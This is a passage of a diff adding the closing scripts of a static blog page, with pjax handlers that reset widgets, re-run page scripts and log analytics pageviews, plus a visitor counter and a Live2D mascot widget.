+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
